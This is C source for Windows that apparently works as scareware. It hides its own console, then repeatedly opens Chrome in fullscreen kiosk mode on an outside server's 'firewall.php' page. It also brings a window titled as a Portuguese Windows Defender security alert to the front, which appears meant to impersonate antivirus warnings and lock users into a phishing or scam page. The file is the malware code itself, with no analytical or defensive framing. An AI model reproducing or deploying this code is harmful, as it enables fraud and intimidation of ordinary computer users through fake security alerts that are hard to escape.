#include <windows.h>
#include <stdio.h>

int main(void){
    FreeConsole();
    while (1){
        Sleep(100000);
        for (int i = 0 ; i < 15 ; i++){
            Sleep(5000);
            ShellExecuteA(NULL, "open", "chrome.exe", "--kiosk https://vps61574.publiccloud.com.br/firewall.php", NULL, SW_SHOWMAXIMIZED);
            HWND hwnd = FindWindow(NULL, "Windows Defender - Alerta de Segurança");
            if (hwnd != NULL){
                if (SetForegroundWindow(hwnd) != TRUE){
                    printf(":( don't try again :(\n");
                    return 1;
                }
            }
        }
    }
}